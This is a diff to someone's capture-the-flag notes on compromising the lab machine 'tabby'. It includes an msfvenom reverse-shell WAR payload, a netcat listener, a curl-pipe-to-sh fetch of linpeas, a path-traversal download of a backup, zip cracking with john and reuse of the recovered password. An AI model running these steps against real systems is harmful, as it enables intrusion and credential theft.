@@ -199,7 +199,8 @@ grep java msf_payloads # java/jsp_shell_reverse_tcp looks good.
 msfvenom -l formats # war is what we need (wait what).
 
 # let's open a listener:
-rlwrap nc -vnlp 42424 # this will be our shell.
+nc -vnlp 42424 # this will be our shell.
+# no rlwrap, we'll use another method in a bit.
 
 # create the payload:
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.69 LPORT=42424 -f war -o shell.war
@@ -232,6 +233,10 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 # ctr-z send to background
 stty raw -echo # setup terminal
 fg # back to shell.
+export TERM=screen-256color # or xterm
+# now we have a good shell. (not perfect though -> less)
+# curcially, we can use ctrl-c without breaking out of the shell completely!
+screen # does not work, insufficient write permissions. different dir maybe?
 
 id # tomcat, tomcat, tomcat
 umask -S # permissions for new files.
@@ -269,4 +274,60 @@ chmod +x linpeas.sh
 # alternatively, don't save it:
 curl 10.10.14.69 | sh -
 ```
+
+```sh
+# kali:
+# get the log to read it in peas:
+cd /root/projects/tabby/exfil
+curl tabby:8080/shell/linpeas.log
+less -R linpeas.log # read it in full.
+  # linpeas gives us the creds for tomcat, that we already found (and used.)
+# there's a zip file in the same folder as the statement that was included by news.php: a backup.
+# in the future I should check out adjacent files.
+wget tabby/news.php?file=../../../../var/www/html/files/16162020_backup.zip -O 16162020_backup.zip
+unzip *.zip # it's encrypted :(
+
+# setup rockyou
+cd /usr/share/wordlists
+gunzip rockyou.txt.gz # will replace the gz with unpacked txt!
+
+cd /root/projects/tabby/exfil
+
+zip2john 16162020_backup.zip -o var/www/html/Readme.txt > 16162020_backup.hash
+
+# try to crack it with john:
+john --wordlist=/usr/share/wordlists/rockyou.txt 16162020_backup.hash
+john --show *.hash
+# if you lose the hash you can still look
+# at the cracked password: ~/.john/john.pot
+
+unzip *.zip # password: admin@it
+
+# it's just a backup, nothing really interesting.
+```
+
+```sh
+# try our new password:
+
+su ash # maybe: admin@it
+# that one worked!
+
+screen # still does not work.
+tmux # this one does and I prefer it, lucky.
+
+# our terminal defaults to 80x24, let's fix that.
+# exit our shell.
+# in kali:
+stty -a | egrep 'row|col' # note down rows and columns.
+# get shell.
+# spawn bash.
+# disable echo, enable raw.
+stty columns 141 rows 21 # values from before.
+# set TERM.
+# switch to ash.
+tmux
+# ctrl-b ctrl-b: send prefix to inner tmux. (if you use it in kali too)
+# press: ctrl-b ctrl-b "
+# tmux should span the entire width and height.
+# tmux works, we have tab completion, control works, vim works!
 ```
